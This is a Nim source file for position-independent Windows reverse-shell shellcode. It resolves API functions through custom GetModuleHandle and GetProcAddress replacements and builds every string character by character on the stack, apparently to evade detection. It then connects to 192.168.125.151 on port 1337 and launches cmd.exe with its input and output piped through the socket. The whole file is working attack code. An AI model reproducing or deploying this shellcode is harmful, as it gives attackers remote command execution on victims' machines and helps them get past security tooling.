import utils/[getmoduleh, getprocaddr, stack, fail]
import winim

# declaring needed functions
type LoadLibraryA   = (proc(lpLibFileName: LPCSTR): HMODULE {.stdcall.})
type WSAStartup     = (proc(wVersionRequested: WORD, lpWSAData: LPWSADATA): int32 {.stdcall.})
type WSASocketA     = (proc(af: int32, `type`: int32, protocol: int32, lpProtocolInfo: LPWSAPROTOCOL_INFOA, g: GROUP, dwFlags: DWORD): SOCKET {.stdcall.})
type inet_addr      = (proc(cp: ptr char): int32 {.stdcall.})
type htons          = (proc(hostshort: uint16): uint16 {.stdcall.})
type connect        = (proc(s: SOCKET, name: ptr sockaddr, namelen: int32): int32 {.stdcall.})
type CreateProcessA = (proc(lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.})

proc main() =
  #[ Start of PIC shellcode]#
  var sHost: array[16, char] 
  sHost[0] = '1'
  sHost[1] = '9'
  sHost[2] = '2'
  sHost[3] = '.'
  sHost[4] = '1'
  sHost[5] = '6'
  sHost[6] = '8'
  sHost[7] = '.'
  sHost[8] = '1'
  sHost[9] = '2'
  sHost[10] = '5'
  sHost[11] = '.'
  sHost[12] = '1'
  sHost[13] = '5'
  sHost[14] = '1'
  sHost[15] = '\0'

  var
    port: uint16 = 1337
    wsaData: WSADATA
  
  var sCmd: array[4, char] 
  sCmd[0] = 'c'
  sCmd[1] = 'm'
  sCmd[2] = 'd'
  sCmd[3] = '\0'

  var sKernel32: array[13, char] 
  sKernel32[0] = 'K'
  sKernel32[1] = 'E'
  sKernel32[2] = 'R'
  sKernel32[3] = 'N'
  sKernel32[4] = 'E'
  sKernel32[5] = 'L'
  sKernel32[6] = '3'
  sKernel32[7] = '2'
  sKernel32[8] = '.'
  sKernel32[9] = 'd'
  sKernel32[10] = 'l'
  sKernel32[11] = 'l'
  sKernel32[12] = '\0'

  var sws2_32: array[11, char]
  sws2_32[0] = 'w'
  sws2_32[1] = 's'
  sws2_32[2] = '2'
  sws2_32[3] = '_'
  sws2_32[4] = '3'
  sws2_32[5] = '2'
  sws2_32[6] = '.'
  sws2_32[7] = 'd'
  sws2_32[8] = 'l'
  sws2_32[9] = 'l'
  sws2_32[10] = '\0'

  var sLoadLibraryA: array[13, char] 
  sLoadLibraryA[0] = 'L'
  sLoadLibraryA[1] = 'o'
  sLoadLibraryA[2] = 'a'
  sLoadLibraryA[3] = 'd'
  sLoadLibraryA[4] = 'L'
  sLoadLibraryA[5] = 'i'
  sLoadLibraryA[6] = 'b'
  sLoadLibraryA[7] = 'r'
  sLoadLibraryA[8] = 'a'
  sLoadLibraryA[9] = 'r'
  sLoadLibraryA[10] = 'y'
  sLoadLibraryA[11] = 'A'
  sLoadLibraryA[12] = '\0'

  var sWSAStartup: array[11, char] 
  sWSAStartup[0] = 'W'
  sWSAStartup[1] = 'S'
  sWSAStartup[2] = 'A'
  sWSAStartup[3] = 'S'
  sWSAStartup[4] = 't'
  sWSAStartup[5] = 'a'
  sWSAStartup[6] = 'r'
  sWSAStartup[7] = 't'
  sWSAStartup[8] = 'u'
  sWSAStartup[9] = 'p'
  sWSAStartup[10] = '\0'

  var sWSASocketA: array[11, char]
  sWSASocketA[0] = 'W'
  sWSASocketA[1] = 'S'
  sWSASocketA[2] = 'A'
  sWSASocketA[3] = 'S'
  sWSASocketA[4] = 'o'
  sWSASocketA[5] = 'c'
  sWSASocketA[6] = 'k'
  sWSASocketA[7] = 'e'
  sWSASocketA[8] = 't'
  sWSASocketA[9] = 'A'
  sWSASocketA[10] = '\0'

  var sinet_addr: array[10, char] 
  sinet_addr[0] = 'i'
  sinet_addr[1] = 'n'
  sinet_addr[2] = 'e'
  sinet_addr[3] = 't'
  sinet_addr[4] = '_'
  sinet_addr[5] = 'a'
  sinet_addr[6] = 'd'
  sinet_addr[7] = 'd'
  sinet_addr[8] = 'r'
  sinet_addr[9] = '\0'

  var shtons: array[6,  char] 
  shtons[0] = 'h'
  shtons[1] = 't'
  shtons[2] = 'o'
  shtons[3] = 'n'
  shtons[4] = 's'
  shtons[5] = '\0'

  var sconnect: array[8,  char]
  sconnect[0] = 'c'
  sconnect[1] = 'o'
  sconnect[2] = 'n'
  sconnect[3] = 'n'
  sconnect[4] = 'e'
  sconnect[5] = 'c'
  sconnect[6] = 't'
  sconnect[7] = '\0'

  var sCreateProcessA: array[15, char] 
  sCreateProcessA[0] = 'C'
  sCreateProcessA[1] = 'r'
  sCreateProcessA[2] = 'e'
  sCreateProcessA[3] = 'a'
  sCreateProcessA[4] = 't'
  sCreateProcessA[5] = 'e'
  sCreateProcessA[6] = 'P'
  sCreateProcessA[7] = 'r'
  sCreateProcessA[8] = 'o'
  sCreateProcessA[9] = 'c'
  sCreateProcessA[10] = 'e'
  sCreateProcessA[11] = 's'
  sCreateProcessA[12] = 's'
  sCreateProcessA[13] = 'A'
  sCreateProcessA[14] = '\0'

  var
    hKernel32: HMODULE = getModuleHandleReplacement(cast[cstring](addr sKernel32[0]))
    pLoadLibraryA: LoadLibraryA = cast[LoadLibraryA](getProcAddressReplacement(hKernel32, cast[cstring](addr sLoadLibraryA[0])))
    hws2_32: HMODULE = pLoadLibraryA(cast[cstring](addr sws2_32[0]))
    pWSAStartup: WSAStartup = cast[WSAStartup](getProcAddressReplacement(hws2_32, cast[cstring](addr sWSAStartup[0])))
    pWSASocketA: WSASocketA = cast[WSASocketA](getProcAddressReplacement(hws2_32, cast[cstring](addr sWSASocketA[0])))
    pinet_addr: inet_addr = cast[inet_addr](getProcAddressReplacement(hws2_32, cast[cstring](addr sinet_addr[0])))
    phtons: htons = cast[htons](getProcAddressReplacement(hws2_32, cast[cstring](addr shtons[0])))
    pconnect: connect = cast[connect](getProcAddressReplacement(hws2_32, cast[cstring](addr sconnect[0])))
    pCreateProcessA: CreateProcessA = cast[CreateProcessA](getProcAddressReplacement(hKernel32, cast[cstring](addr sCreateProcessA[0])))

  # call WSAStartup
  var wsaStartupRes = pWSAStartup(MAKEWORD(2,2), addr wsaData)
  # if socket != 0: failCatch()

  # call WSASocket
  var socket = pWSASocketA(2, 1, 6, NULL, cast[GROUP](0), cast[DWORD](NULL))

  # create sockaddr_in struct
  var sa: sockaddr_in
  sa.sin_family = AF_INET
  sa.sinaddr.S_addr = pinet_addr(cast[cstring](addr sHost[0]))
  sa.sin_port = phtons(port)

  # call connect
  var connectResult = pconnect(socket, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))
  # if connectResult != 0: failCatch()

  # call CreateProcessA
  var 
    si: STARTUPINFO
    pi: PROCESS_INFORMATION
  si.cb = cast[DWORD](sizeof(si))
  si.dwFlags = STARTF_USESTDHANDLES
  si.hStdInput = cast[HANDLE](socket)
  si.hStdOutput = cast[HANDLE](socket)
  si.hStdError = cast[HANDLE](socket)

  discard pCreateProcessA(
    NULL,
    cast[LPSTR](addr sCmd[0]),
    NULL,
    NULL,
    TRUE,
    0,
    NULL,
    NULL,
    cast[LPSTARTUPINFOA](addr si),
    addr pi
  )

when isMainModule:
  allignStack()
  main()